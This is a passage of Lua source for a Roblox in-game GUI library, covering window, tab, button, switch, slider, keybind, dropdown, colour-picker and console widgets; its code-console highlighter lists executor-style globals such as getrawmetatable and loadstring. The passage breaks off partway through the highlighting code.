Switch.TextColor3 = Color3.new(1, 1, 1)
Switch.TextSize = 18

TextButton_Roundify_4px_4.Name = "TextButton_Roundify_4px"
TextButton_Roundify_4px_4.Parent = Switch
TextButton_Roundify_4px_4.BackgroundColor3 = Color3.new(1, 1, 1)
TextButton_Roundify_4px_4.BackgroundTransparency = 1
TextButton_Roundify_4px_4.Size = UDim2.new(1, 0, 1, 0)
TextButton_Roundify_4px_4.Image = "rbxassetid://2851929490"
TextButton_Roundify_4px_4.ImageColor3 = Color3.new(0.160784, 0.290196, 0.478431)
TextButton_Roundify_4px_4.ImageTransparency = 0.5
TextButton_Roundify_4px_4.ScaleType = Enum.ScaleType.Slice
TextButton_Roundify_4px_4.SliceCenter = Rect.new(4, 4, 4, 4)

Title_3.Name = "Title"
Title_3.Parent = Switch
Title_3.BackgroundColor3 = Color3.new(1, 1, 1)
Title_3.BackgroundTransparency = 1
Title_3.Position = UDim2.new(1.20000005, 0, 0, 0)
Title_3.Size = UDim2.new(0, 20, 0, 20)
Title_3.Font = Enum.Font.GothamSemibold
Title_3.Text = "Switch"
Title_3.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
Title_3.TextSize = 14
Title_3.TextXAlignment = Enum.TextXAlignment.Left

Button_2.Name = "Button"
Button_2.Parent = Prefabs
Button_2.BackgroundColor3 = Color3.new(0.160784, 0.290196, 0.478431)
Button_2.BackgroundTransparency = 1
Button_2.BorderSizePixel = 0
Button_2.Size = UDim2.new(0, 91, 0, 20)
Button_2.ZIndex = 2
Button_2.Font = Enum.Font.GothamSemibold
Button_2.TextColor3 = Color3.new(1, 1, 1)
Button_2.TextSize = 14

TextButton_Roundify_4px_5.Name = "TextButton_Roundify_4px"
TextButton_Roundify_4px_5.Parent = Button_2
TextButton_Roundify_4px_5.BackgroundColor3 = Color3.new(1, 1, 1)
TextButton_Roundify_4px_5.BackgroundTransparency = 1
TextButton_Roundify_4px_5.Size = UDim2.new(1, 0, 1, 0)
TextButton_Roundify_4px_5.Image = "rbxassetid://2851929490"
TextButton_Roundify_4px_5.ImageColor3 = Color3.new(0.160784, 0.290196, 0.478431)
TextButton_Roundify_4px_5.ScaleType = Enum.ScaleType.Slice
TextButton_Roundify_4px_5.SliceCenter = Rect.new(4, 4, 4, 4)

DropdownButton.Name = "DropdownButton"
DropdownButton.Parent = Prefabs
DropdownButton.BackgroundColor3 = Color3.new(0.129412, 0.133333, 0.141176)
DropdownButton.BorderSizePixel = 0
DropdownButton.Size = UDim2.new(1, 0, 0, 20)
DropdownButton.ZIndex = 3
DropdownButton.Font = Enum.Font.GothamBold
DropdownButton.Text = "      Button"
DropdownButton.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
DropdownButton.TextSize = 14
DropdownButton.TextXAlignment = Enum.TextXAlignment.Left

Keybind.Name = "Keybind"
Keybind.Parent = Prefabs
Keybind.BackgroundColor3 = Color3.new(1, 1, 1)
Keybind.BackgroundTransparency = 1
Keybind.Size = UDim2.new(0, 200, 0, 20)
Keybind.Image = "rbxassetid://2851929490"
Keybind.ImageColor3 = Color3.new(0.203922, 0.207843, 0.219608)
Keybind.ScaleType = Enum.ScaleType.Slice
Keybind.SliceCenter = Rect.new(4, 4, 4, 4)

Title_4.Name = "Title"
Title_4.Parent = Keybind
Title_4.BackgroundColor3 = Color3.new(1, 1, 1)
Title_4.BackgroundTransparency = 1
Title_4.Size = UDim2.new(0, 0, 1, 0)
Title_4.Font = Enum.Font.GothamBold
Title_4.Text = "Keybind"
Title_4.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
Title_4.TextSize = 14
Title_4.TextXAlignment = Enum.TextXAlignment.Left

Input.Name = "Input"
Input.Parent = Keybind
Input.BackgroundColor3 = Color3.new(1, 1, 1)
Input.BackgroundTransparency = 1
Input.BorderSizePixel = 0
Input.Position = UDim2.new(1, -85, 0, 2)
Input.Size = UDim2.new(0, 80, 1, -4)
Input.ZIndex = 2
Input.Font = Enum.Font.GothamSemibold
Input.Text = "RShift"
Input.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
Input.TextSize = 12
Input.TextWrapped = true

Input_Roundify_4px.Name = "Input_Roundify_4px"
Input_Roundify_4px.Parent = Input
Input_Roundify_4px.BackgroundColor3 = Color3.new(1, 1, 1)
Input_Roundify_4px.BackgroundTransparency = 1
Input_Roundify_4px.Size = UDim2.new(1, 0, 1, 0)
Input_Roundify_4px.Image = "rbxassetid://2851929490"
Input_Roundify_4px.ImageColor3 = Color3.new(0.290196, 0.294118, 0.313726)
Input_Roundify_4px.ScaleType = Enum.ScaleType.Slice
Input_Roundify_4px.SliceCenter = Rect.new(4, 4, 4, 4)

Windows.Name = "Windows"
Windows.Parent = imgui
Windows.BackgroundColor3 = Color3.new(1, 1, 1)
Windows.BackgroundTransparency = 1
Windows.Position = UDim2.new(0, 20, 0, 20)
Windows.Size = UDim2.new(1, 20, 1, -20)

--[[ Script ]]--
script.Parent = imgui

local UIS = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RS = game:GetService("RunService")
local ps = game:GetService("Players")

local p = ps.LocalPlayer
local mouse = p:GetMouse()

local Prefabs = script.Parent:WaitForChild("Prefabs")
local Windows = script.Parent:FindFirstChild("Windows")

local checks = {
	["binding"] = false,
}

UIS.InputBegan:Connect(function(input, gameProcessed)
	if input.KeyCode == ((typeof(ui_options.toggle_key) == "EnumItem") and ui_options.toggle_key or Enum.KeyCode.RightShift) then
		if script.Parent then
			if not checks.binding then
				script.Parent.Enabled = not script.Parent.Enabled
			end
		end
	end
end)

local function Resize(part, new, _delay)
	_delay = _delay or 0.5
	local tweenInfo = TweenInfo.new(_delay, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	local tween = TweenService:Create(part, tweenInfo, new)
	tween:Play()
end

local function rgbtohsv(r, g, b) -- idk who made this function, but thanks
	r, g, b = r / 255, g / 255, b / 255
	local max, min = math.max(r, g, b), math.min(r, g, b)
	local h, s, v
	v = max

	local d = max - min
	if max == 0 then
		s = 0
	else
		s = d / max
	end

	if max == min then
		h = 0
	else
		if max == r then
			h = (g - b) / d
			if g < b then
				h = h + 6
			end
		elseif max == g then
			h = (b - r) / d + 2
		elseif max == b then
			h = (r - g) / d + 4
		end
		h = h / 6
	end

	return h, s, v
end

local function hasprop(object, prop)
	local a, b = pcall(function()
		return object[tostring(prop)]
	end)
	if a then
		return b
	end
end

local function gNameLen(obj)
	return obj.TextBounds.X + 15
end

local function gMouse()
	return Vector2.new(UIS:GetMouseLocation().X + 1, UIS:GetMouseLocation().Y - 35)
end

local function ripple(button, x, y)
	spawn(function()
		button.ClipsDescendants = true

		local circle = Prefabs:FindFirstChild("Circle"):Clone()

		circle.Parent = button
		circle.ZIndex = 1000

		local new_x = x - circle.AbsolutePosition.X
		local new_y = y - circle.AbsolutePosition.Y
		circle.Position = UDim2.new(0, new_x, 0, new_y)

		local size = 0
		if button.AbsoluteSize.X > button.AbsoluteSize.Y then
			size = button.AbsoluteSize.X * 1.5
		elseif button.AbsoluteSize.X < button.AbsoluteSize.Y then
			size = button.AbsoluteSize.Y * 1.5
		elseif button.AbsoluteSize.X == button.AbsoluteSize.Y then
			size = button.AbsoluteSize.X * 1.5
		end

		circle:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, -size / 2, 0.5, -size / 2), "Out", "Quad", 0.5, false, nil)
		Resize(circle, {ImageTransparency = 1}, 0.5)

		wait(0.5)
		circle:Destroy()
	end)
end

local windows = 0
local library = {}

local function format_windows()
	local ull = Prefabs:FindFirstChild("UIListLayout"):Clone()
	ull.Parent = Windows
	local data = {}

	for i,v in next, Windows:GetChildren() do
		if not (v:IsA("UIListLayout")) then
			data[v] = v.AbsolutePosition
		end
	end

	ull:Destroy()

	for i,v in next, data do
		i.Position = UDim2.new(0, v.X, 0, v.Y)
	end
end

function library:FormatWindows()
	format_windows()
end

function library:AddWindow(title, options)
	windows = windows + 1
	local dropdown_open = false
	title = tostring(title or "New Window")
	options = (typeof(options) == "table") and options or ui_options
	options.tween_time = 0.1

	local Window = Prefabs:FindFirstChild("Window"):Clone()
	Window.Parent = Windows
	Window:FindFirstChild("Title").Text = title
	Window.Size = UDim2.new(0, options.min_size.X, 0, options.min_size.Y)
	Window.ZIndex = Window.ZIndex + (windows * 10)

	do -- Altering Window Color
		local Title = Window:FindFirstChild("Title")
		local Bar = Window:FindFirstChild("Bar")
		local Base = Bar:FindFirstChild("Base")
		local Top = Bar:FindFirstChild("Top")
		local SplitFrame = Window:FindFirstChild("TabSelection"):FindFirstChild("Frame")
		local Toggle = Bar:FindFirstChild("Toggle")

		spawn(function()
			while true do
				Bar.BackgroundColor3 = options.main_color
				Base.BackgroundColor3 = options.main_color
				Base.ImageColor3 = options.main_color
				Top.ImageColor3 = options.main_color
				SplitFrame.BackgroundColor3 = options.main_color

				RS.Heartbeat:Wait()
			end
		end)

	end

	local Resizer = Window:WaitForChild("Resizer")

	local window_data = {}
	Window.Draggable = true

	do -- Resize Window
		local oldIcon = mouse.Icon
		local Entered = false
		Resizer.MouseEnter:Connect(function()
			Window.Draggable = false
			if options.can_resize then
				oldIcon = mouse.Icon
				-- mouse.Icon = "http://www.roblox.com/asset?id=4745131330"
			end
			Entered = true
		end)

		Resizer.MouseLeave:Connect(function()
			Entered = false
			if options.can_resize then
				mouse.Icon = oldIcon
			end
			Window.Draggable = true
		end)

		local Held = false
		UIS.InputBegan:Connect(function(inputObject)
			if inputObject.UserInputType == Enum.UserInputType.MouseButton1 then
				Held = true

				spawn(function() -- Loop check
					if Entered and Resizer.Active and options.can_resize then
						while Held and Resizer.Active do

							local mouse_location = gMouse()
							local x = mouse_location.X - Window.AbsolutePosition.X
							local y = mouse_location.Y - Window.AbsolutePosition.Y

							--
							if x >= options.min_size.X and y >= options.min_size.Y then
								Resize(Window, {Size = UDim2.new(0, x, 0, y)}, options.tween_time)
							elseif x >= options.min_size.X then
								Resize(Window, {Size = UDim2.new(0, x, 0, options.min_size.Y)}, options.tween_time)
							elseif y >= options.min_size.Y then
								Resize(Window, {Size = UDim2.new(0, options.min_size.X, 0, y)}, options.tween_time)
							else
								Resize(Window, {Size = UDim2.new(0, options.min_size.X, 0, options.min_size.Y)}, options.tween_time)
							end

							RS.Heartbeat:Wait()
						end
					end
				end)
			end
		end)
		UIS.InputEnded:Connect(function(inputObject)
			if inputObject.UserInputType == Enum.UserInputType.MouseButton1 then
				Held = false
			end
		end)
	end

	do -- [Open / Close] Window
		local open_close = Window:FindFirstChild("Bar"):FindFirstChild("Toggle")
		local open = true
		local canopen = true

		local oldwindowdata = {}
		local oldy = Window.AbsoluteSize.Y
		open_close.MouseButton1Click:Connect(function()
			if canopen then
				canopen = false

				if open then
					-- Close

					oldwindowdata = {}
					for i,v in next, Window:FindFirstChild("Tabs"):GetChildren() do
						oldwindowdata[v] = v.Visible
						v.Visible = false
					end

					Resizer.Active = false

					oldy = Window.AbsoluteSize.Y
					Resize(open_close, {Rotation = 0}, options.tween_time)
					Resize(Window, {Size = UDim2.new(0, Window.AbsoluteSize.X, 0, 26)}, options.tween_time)
					open_close.Parent:FindFirstChild("Base").Transparency = 1

				else
					-- Open

					for i,v in next, oldwindowdata do
						i.Visible = v
					end

					Resizer.Active = true

					Resize(open_close, {Rotation = 90}, options.tween_time)
					Resize(Window, {Size = UDim2.new(0, Window.AbsoluteSize.X, 0, oldy)}, options.tween_time)
					open_close.Parent:FindFirstChild("Base").Transparency = 0

				end

				open = not open
				wait(options.tween_time)
				canopen = true

			end
		end)
	end

	do -- UI Elements
		local tabs = Window:FindFirstChild("Tabs")
		local tab_selection = Window:FindFirstChild("TabSelection")
		local tab_buttons = tab_selection:FindFirstChild("TabButtons")

		do -- Add Tab
			function window_data:AddTab(tab_name)
				local tab_data = {}
				tab_name = tostring(tab_name or "New Tab")
				tab_selection.Visible = true

				local new_button = Prefabs:FindFirstChild("TabButton"):Clone()
				new_button.Parent = tab_buttons
				new_button.Text = tab_name
				new_button.Size = UDim2.new(0, gNameLen(new_button), 0, 20)
				new_button.ZIndex = new_button.ZIndex + (windows * 10)
				new_button:GetChildren()[1].ZIndex = new_button:GetChildren()[1].ZIndex + (windows * 10)

				local new_tab = Prefabs:FindFirstChild("Tab"):Clone()
				new_tab.Parent = tabs
				new_tab.ZIndex = new_tab.ZIndex + (windows * 10)

				local function show()
					if dropdown_open then return end
					for i, v in next, tab_buttons:GetChildren() do
						if not (v:IsA("UIListLayout")) then
							v:GetChildren()[1].ImageColor3 = Color3.fromRGB(52, 53, 56)
							Resize(v, {Size = UDim2.new(0, v.AbsoluteSize.X, 0, 20)}, options.tween_time)
						end
					end
					for i, v in next, tabs:GetChildren() do
						v.Visible = false
					end

					Resize(new_button, {Size = UDim2.new(0, new_button.AbsoluteSize.X, 0, 25)}, options.tween_time)
					new_button:GetChildren()[1].ImageColor3 = Color3.fromRGB(73, 75, 79)
					new_tab.Visible = true
				end

				new_button.MouseButton1Click:Connect(function()
					show()
				end)

				function tab_data:Show()
					show()
				end

				do -- Tab Elements

					function tab_data:AddLabel(label_text) -- [Label]
						label_text = tostring(label_text or "New Label")

						local label = Prefabs:FindFirstChild("Label"):Clone()

						label.Parent = new_tab
						label.Text = label_text
						label.Size = UDim2.new(0, gNameLen(label), 0, 20)
						label.ZIndex = label.ZIndex + (windows * 10)

						return label
					end

					function tab_data:AddButton(button_text, callback) -- [Button]
						button_text = tostring(button_text or "New Button")
						callback = typeof(callback) == "function" and callback or function()end

						local button = Prefabs:FindFirstChild("Button"):Clone()

						button.Parent = new_tab
						button.Text = button_text
						button.Size = UDim2.new(0, gNameLen(button), 0, 20)
						button.ZIndex = button.ZIndex + (windows * 10)
						button:GetChildren()[1].ZIndex = button:GetChildren()[1].ZIndex + (windows * 10)

						spawn(function()
							while true do
								if button and button:GetChildren()[1] then
									button:GetChildren()[1].ImageColor3 = options.main_color
								end
								RS.Heartbeat:Wait()
							end
						end)

						button.MouseButton1Click:Connect(function()
							ripple(button, mouse.X, mouse.Y)
							pcall(callback)
						end)

						return button
					end

					function tab_data:AddSwitch(switch_text, callback) -- [Switch]
						local switch_data = {}

						switch_text = tostring(switch_text or "New Switch")
						callback = typeof(callback) == "function" and callback or function()end

						local switch = Prefabs:FindFirstChild("Switch"):Clone()

						switch.Parent = new_tab
						switch:FindFirstChild("Title").Text = switch_text

						switch:FindFirstChild("Title").ZIndex = switch:FindFirstChild("Title").ZIndex + (windows * 10)
						switch.ZIndex = switch.ZIndex + (windows * 10)
						switch:GetChildren()[1].ZIndex = switch:GetChildren()[1].ZIndex + (windows * 10)

						spawn(function()
							while true do
								if switch and switch:GetChildren()[1] then
									switch:GetChildren()[1].ImageColor3 = options.main_color
								end
								RS.Heartbeat:Wait()
							end
						end)

						local toggled = false
						switch.MouseButton1Click:Connect(function()
							toggled = not toggled
							switch.Text = toggled and utf8.char(10003) or ""
							pcall(callback, toggled)
						end)

						function switch_data:Set(bool)
							toggled = (typeof(bool) == "boolean") and bool or false
							switch.Text = toggled and utf8.char(10003) or ""
							pcall(callback,toggled)
						end

						return switch_data, switch
					end

					function tab_data:AddTextBox(textbox_text, callback, textbox_options)
						textbox_text = tostring(textbox_text or "New TextBox")
						callback = typeof(callback) == "function" and callback or function()end
						textbox_options = typeof(textbox_options) == "table" and textbox_options or {["clear"] = true}
						textbox_options = {
							["clear"] = ((textbox_options.clear) == true)
						}

						local textbox = Prefabs:FindFirstChild("TextBox"):Clone()

						textbox.Parent = new_tab
						textbox.PlaceholderText = textbox_text
						textbox.ZIndex = textbox.ZIndex + (windows * 10)
						textbox:GetChildren()[1].ZIndex = textbox:GetChildren()[1].ZIndex + (windows * 10)

						textbox.FocusLost:Connect(function(ep)
							if ep then
								if #textbox.Text > 0 then
									pcall(callback, textbox.Text)
									if textbox_options.clear then
										textbox.Text = ""
									end
								end
							end
						end)

						return textbox
					end

					function tab_data:AddSlider(slider_text, callback, slider_options)
						local slider_data = {}

						slider_text = tostring(slider_text or "New Slider")
						callback = typeof(callback) == "function" and callback or function()end
						slider_options = typeof(slider_options) == "table" and slider_options or {}
						slider_options = {
							["min"] = slider_options.min or 0,
							["max"] = slider_options.max or 100,
							["readonly"] = slider_options.readonly or false,
						}

						local slider = Prefabs:FindFirstChild("Slider"):Clone()

						slider.Parent = new_tab
						slider.ZIndex = slider.ZIndex + (windows * 10)

						local title = slider:FindFirstChild("Title")
						local indicator = slider:FindFirstChild("Indicator")
						local value = slider:FindFirstChild("Value")
						title.ZIndex = title.ZIndex + (windows * 10)
						indicator.ZIndex = indicator.ZIndex + (windows * 10)
						value.ZIndex = value.ZIndex + (windows * 10)

						title.Text = slider_text

						do -- Slider Math
							local Entered = false
							slider.MouseEnter:Connect(function()
								Entered = true
								Window.Draggable = false
							end)
							slider.MouseLeave:Connect(function()
								Entered = false
								Window.Draggable = true
							end)

							local Held = false
							UIS.InputBegan:Connect(function(inputObject)
								if inputObject.UserInputType == Enum.UserInputType.MouseButton1 then
									Held = true

									spawn(function() -- Loop check
										if Entered and not slider_options.readonly then
											while Held and (not dropdown_open) do
												local mouse_location = gMouse()
												local x = (slider.AbsoluteSize.X - (slider.AbsoluteSize.X - ((mouse_location.X - slider.AbsolutePosition.X)) + 1)) / slider.AbsoluteSize.X

												local min = 0
												local max = 1

												local size = min
												if x >= min and x <= max then
													size = x
												elseif x < min then
													size = min
												elseif x > max then
													size = max
												end

												Resize(indicator, {Size = UDim2.new(size or min, 0, 0, 20)}, options.tween_time)
												local p = math.floor((size or min) * 100)

												local maxv = slider_options.max
												local minv = slider_options.min
												local diff = maxv - minv

												local sel_value = math.floor(((diff / 100) * p) + minv)

												value.Text = tostring(sel_value)
												pcall(callback, sel_value)

												RS.Heartbeat:Wait()
											end
										end
									end)
								end
							end)
							UIS.InputEnded:Connect(function(inputObject)
								if inputObject.UserInputType == Enum.UserInputType.MouseButton1 then
									Held = false
								end
							end)

							function slider_data:Set(new_value)
								new_value = tonumber(new_value) or 0
								new_value = (((new_value >= 0 and new_value <= 100) and new_value) / 100)

								Resize(indicator, {Size = UDim2.new(new_value or 0, 0, 0, 20)}, options.tween_time)
								local p = math.floor((new_value or 0) * 100)

								local maxv = slider_options.max
								local minv = slider_options.min
								local diff = maxv - minv

								local sel_value = math.floor(((diff / 100) * p) + minv)

								value.Text = tostring(sel_value)
								pcall(callback, sel_value)
							end

							slider_data:Set(slider_options["min"])
						end

						return slider_data, slider
					end

					function tab_data:AddKeybind(keybind_name, callback, keybind_options)
						local keybind_data = {}

						keybind_name = tostring(keybind_name or "New Keybind")
						callback = typeof(callback) == "function" and callback or function()end
						keybind_options = typeof(keybind_options) == "table" and keybind_options or {}
						keybind_options = {
							["standard"] = keybind_options.standard or Enum.KeyCode.RightShift,
						}

						local keybind = Prefabs:FindFirstChild("Keybind"):Clone()
						local input = keybind:FindFirstChild("Input")
						local title = keybind:FindFirstChild("Title")
						keybind.ZIndex = keybind.ZIndex + (windows * 10)
						input.ZIndex = input.ZIndex + (windows * 10)
						input:GetChildren()[1].ZIndex = input:GetChildren()[1].ZIndex + (windows * 10)
						title.ZIndex = title.ZIndex + (windows * 10)

						keybind.Parent = new_tab
						title.Text = "  " .. keybind_name
						keybind.Size = UDim2.new(0, gNameLen(title) + 80, 0, 20)

						local shortkeys = { -- thanks to stroketon for helping me out with this
							RightControl = 'RightCtrl',
							LeftControl = 'LeftCtrl',
							LeftShift = 'LShift',
							RightShift = 'RShift',
							MouseButton1 = "Mouse1",
							MouseButton2 = "Mouse2"
						}

						local keybind = keybind_options.standard

						function keybind_data:SetKeybind(Keybind)
							local key = shortkeys[Keybind.Name] or Keybind.Name
							input.Text = key
							keybind = Keybind
						end

						UIS.InputBegan:Connect(function(a, b)
							if checks.binding then
								spawn(function()
									wait()
									checks.binding = false
								end)
								return
							end
							if a.KeyCode == keybind and not b then
								pcall(callback, keybind)
							end
						end)

						keybind_data:SetKeybind(keybind_options.standard)

						input.MouseButton1Click:Connect(function()
							if checks.binding then return end
							input.Text = "..."
							checks.binding = true
							local a, b = UIS.InputBegan:Wait()
							keybind_data:SetKeybind(a.KeyCode)
						end)

						return keybind_data, keybind
					end

					function tab_data:AddDropdown(dropdown_name, callback)
						local dropdown_data = {}
						dropdown_name = tostring(dropdown_name or "New Dropdown")
						callback = typeof(callback) == "function" and callback or function()end

						local dropdown = Prefabs:FindFirstChild("Dropdown"):Clone()
						local box = dropdown:FindFirstChild("Box")
						local objects = box:FindFirstChild("Objects")
						local indicator = dropdown:FindFirstChild("Indicator")
						dropdown.ZIndex = dropdown.ZIndex + (windows * 10)
						box.ZIndex = box.ZIndex + (windows * 10)
						objects.ZIndex = objects.ZIndex + (windows * 10)
						indicator.ZIndex = indicator.ZIndex + (windows * 10)
						dropdown:GetChildren()[3].ZIndex = dropdown:GetChildren()[3].ZIndex + (windows * 10)

						dropdown.Parent = new_tab
						dropdown.Text = "      " .. dropdown_name
						box.Size = UDim2.new(1, 0, 0, 0)

						local open = false
						dropdown.MouseButton1Click:Connect(function()
							open = not open

							local len = (#objects:GetChildren() - 1) * 20
							if #objects:GetChildren() - 1 >= 10 then
								len = 10 * 20
								objects.CanvasSize = UDim2.new(0, 0, (#objects:GetChildren() - 1) * 0.1, 0)
							end

							if open then -- Open
								if dropdown_open then return end
								dropdown_open = true
								Resize(box, {Size = UDim2.new(1, 0, 0, len)}, options.tween_time)
								Resize(indicator, {Rotation = 90}, options.tween_time)
							else -- Close
								dropdown_open = false
								Resize(box, {Size = UDim2.new(1, 0, 0, 0)}, options.tween_time)
								Resize(indicator, {Rotation = -90}, options.tween_time)
							end

						end)

						function dropdown_data:Add(n)
							local object_data = {}
							n = tostring(n or "New Object")

							local object = Prefabs:FindFirstChild("DropdownButton"):Clone()

							object.Parent = objects
							object.Text = n
							object.ZIndex = object.ZIndex + (windows * 10)

							object.MouseEnter:Connect(function()
								object.BackgroundColor3 = options.main_color
							end)
							object.MouseLeave:Connect(function()
								object.BackgroundColor3 = Color3.fromRGB(33, 34, 36)
							end)

							if open then
								local len = (#objects:GetChildren() - 1) * 20
								if #objects:GetChildren() - 1 >= 10 then
									len = 10 * 20
									objects.CanvasSize = UDim2.new(0, 0, (#objects:GetChildren() - 1) * 0.1, 0)
								end
								Resize(box, {Size = UDim2.new(1, 0, 0, len)}, options.tween_time)
							end

							object.MouseButton1Click:Connect(function()
								if dropdown_open then
									dropdown.Text = "      [ " .. n .. " ]"
									dropdown_open = false
									open = false
									Resize(box, {Size = UDim2.new(1, 0, 0, 0)}, options.tween_time)
									Resize(indicator, {Rotation = -90}, options.tween_time)
									pcall(callback, n)
								end
							end)

							function object_data:Remove()
								object:Destroy()
							end

							return object, object_data
						end

						return dropdown_data, dropdown
					end

					function tab_data:AddColorPicker(callback)
						local color_picker_data = {}
						callback = typeof(callback) == "function" and callback or function()end

						local color_picker = Prefabs:FindFirstChild("ColorPicker"):Clone()

						color_picker.Parent = new_tab
						color_picker.ZIndex = color_picker.ZIndex + (windows * 10)

						local palette = color_picker:FindFirstChild("Palette")
						local sample = color_picker:FindFirstChild("Sample")
						local saturation = color_picker:FindFirstChild("Saturation")
						palette.ZIndex = palette.ZIndex + (windows * 10)
						sample.ZIndex = sample.ZIndex + (windows * 10)
						saturation.ZIndex = saturation.ZIndex + (windows * 10)

						do -- Color Picker Math
							local h = 0
							local s = 1
							local v = 1

							local function update()
								local color = Color3.fromHSV(h, s, v)
								sample.ImageColor3 = color
								saturation.ImageColor3 = Color3.fromHSV(h, 1, 1)
								pcall(callback, color)
							end

							do
								local color = Color3.fromHSV(h, s, v)
								sample.ImageColor3 = color
								saturation.ImageColor3 = Color3.fromHSV(h, 1, 1)
							end

							local Entered1, Entered2 = false, false
							palette.MouseEnter:Connect(function()
								Window.Draggable = false
								Entered1 = true
							end)
							palette.MouseLeave:Connect(function()
								Window.Draggable = true
								Entered1 = false
							end)
							saturation.MouseEnter:Connect(function()
								Window.Draggable = false
								Entered2 = true
							end)
							saturation.MouseLeave:Connect(function()
								Window.Draggable = true
								Entered2 = false
							end)

							local palette_indicator = palette:FindFirstChild("Indicator")
							local saturation_indicator = saturation:FindFirstChild("Indicator")
							palette_indicator.ZIndex = palette_indicator.ZIndex + (windows * 10)
							saturation_indicator.ZIndex = saturation_indicator.ZIndex + (windows * 10)

							local Held = false
							UIS.InputBegan:Connect(function(inputObject)
								if inputObject.UserInputType == Enum.UserInputType.MouseButton1 then
									Held = true

									spawn(function() -- Loop check
										while Held and Entered1 and (not dropdown_open) do -- Palette
											local mouse_location = gMouse()

											local x = ((palette.AbsoluteSize.X - (mouse_location.X - palette.AbsolutePosition.X)) + 1)
											local y = ((palette.AbsoluteSize.Y - (mouse_location.Y - palette.AbsolutePosition.Y)) + 1.5)

											local color = Color3.fromHSV(x / 100, y / 100, 0)
											h = x / 100
											s = y / 100

											Resize(palette_indicator, {Position = UDim2.new(0, math.abs(x - 100) - (palette_indicator.AbsoluteSize.X / 2), 0, math.abs(y - 100) - (palette_indicator.AbsoluteSize.Y / 2))}, options.tween_time)

											update()
											RS.Heartbeat:Wait()
										end

										while Held and Entered2 and (not dropdown_open) do -- Saturation
											local mouse_location = gMouse()
											local y = ((palette.AbsoluteSize.Y - (mouse_location.Y - palette.AbsolutePosition.Y)) + 1.5)
											v = y / 100

											Resize(saturation_indicator, {Position = UDim2.new(0, 0, 0, math.abs(y - 100))}, options.tween_time)

											update()
											RS.Heartbeat:Wait()
										end
									end)
								end
							end)
							UIS.InputEnded:Connect(function(inputObject)
								if inputObject.UserInputType == Enum.UserInputType.MouseButton1 then
									Held = false
								end
							end)

							function color_picker_data:Set(color)
								color = typeof(color) == "Color3" and color or Color3.new(1, 1, 1)
								local h2, s2, v2 = rgbtohsv(color.r * 255, color.g * 255, color.b * 255)
								sample.ImageColor3 = color
								saturation.ImageColor3 = Color3.fromHSV(h2, 1, 1)
								pcall(callback, color)
							end
						end

						return color_picker_data, color_picker
					end

					function tab_data:AddConsole(console_options)
						local console_data = {}

						console_options = typeof(console_options) == "table" and console_options or {["readonly"] = true,["full"] = false,}
						console_options = {
							["y"] = tonumber(console_options.y) or 200,
							["source"] = console_options.source or "Logs",
							["readonly"] = ((console_options.readonly) == true),
							["full"] = ((console_options.full) == true),
						}

						local console = Prefabs:FindFirstChild("Console"):Clone()

						console.Parent = new_tab
						console.ZIndex = console.ZIndex + (windows * 10)
						console.Size = UDim2.new(1, 0, console_options.full and 1 or 0, console_options.y)

						local sf = console:GetChildren()[1]
						local Source = sf:FindFirstChild("Source")
						local Lines = sf:FindFirstChild("Lines")
						Source.ZIndex = Source.ZIndex + (windows * 10)
						Lines.ZIndex = Lines.ZIndex + (windows * 10)

						Source.TextEditable = not console_options.readonly

						do -- Syntax Zindex
							for i,v in next, Source:GetChildren() do
								v.ZIndex = v.ZIndex + (windows * 10) + 1
							end
						end
						Source.Comments.ZIndex = Source.Comments.ZIndex + 1

						do -- Highlighting (thanks to whoever made this)
							local lua_keywords = {"and", "break", "do", "else", "elseif", "end", "false", "for", "function", "goto", "if", "in", "local", "nil", "not", "or", "repeat", "return", "then", "true", "until", "while"}
							local global_env = {"getrawmetatable", "newcclosure", "islclosure", "setclipboard", "game", "workspace", "script", "math", "string", "table", "print", "wait", "BrickColor", "Color3", "next", "pairs", "ipairs", "select", "unpack", "Instance", "Vector2", "Vector3", "CFrame", "Ray", "UDim2", "Enum", "assert", "error", "warn", "tick", "loadstring", "_G", "shared", "getfenv", "setfenv", "newproxy", "setmetatable", "getmetatable", "os", "debug", "pcall", "ypcall", "xpcall", "rawequal", "rawset", "rawget", "tonumber", "tostring", "type", "typeof", "_VERSION", "coroutine", "delay", "require", "spawn", "LoadLibrary", "settings", "stats", "time", "UserSettings", "version", "Axes", "ColorSequence", "Faces", "ColorSequenceKeypoint", "NumberRange", "NumberSequence", "NumberSequenceKeypoint", "gcinfo", "elapsedTime", "collectgarbage", "PhysicalProperties", "Rect", "Region3", "Region3int16", "UDim", "Vector2int16", "Vector3int16", "load", "fire", "Fire"}

							local Highlight = function(string, keywords)
								local K = {}
								local S = string
								local Token =
									{
									["="] = true,
									["."] = true,
									[","] = true,
									["("] = true,
									[")"] = true,
									["["] = true,
									["]"] = true,
									["{"] = true,
									["}"] = true,
									[":"] = true,
									["*"] = true,
									["/"] = true,
									["+"] = true,
									["-"] = true,
									["%"] = true,
									[";"] = true,
									["~"] = true
								}
								for i, v in pairs(keywords) do
									K[v] = true
								end
								S = S:gsub(".", function(c)
									if Token[c] ~= nil then
										return "\32"
									else
										return c
									end
								end)
								S = S:gsub("%S+", function(c)
									if K[c] ~= nil then
										return c
									else
										return (" "):rep(#c)
									end
								end)

								return S
							end

							local hTokens = function(string)
								local Token =
									{
									["="] = true,
									["."] = true,
									[","] = true,
									["("] = true,
									[")"] = true,
									["["] = true,
									["]"] = true,
									["{"] = true,
									["}"] = true,
									[":"] = true,
									["*"] = true,
									["/"] = true,
									["+"] = true,
									["-"] = true,
									["%"] = true,
									[";"] = true,
									["~"] = true
								}
								local A = ""
								string:gsub(".", function(c)
									if Token[c] ~= nil then
										A = A .. c
									elseif c == "\n" then
										A = A .. "\n"
									elseif c == "\t" then
										A = A .. "\t"
									else
										A = A .. "\32"
									end
								end)

								return A
							end

							local strings = function(string)
								local highlight = ""
								local quote = false
								string:gsub(".", function(c)
									if quote == false and c == "\34" then
										quote = true
									elseif quote == true and c == "\34" then
										quote = false
									end
									if quote == false and c == "\34" then
										highlight = highlight .. "\34"
									elseif c == "\n" then
										highlight = highlight .. "\n"
									elseif c == "\t" then
										highlight = highlight .. "\t"
									elseif quote == true then
										highlight = highlight .. c
									elseif quote == false then
										highlight = highlight .. "\32"
									end
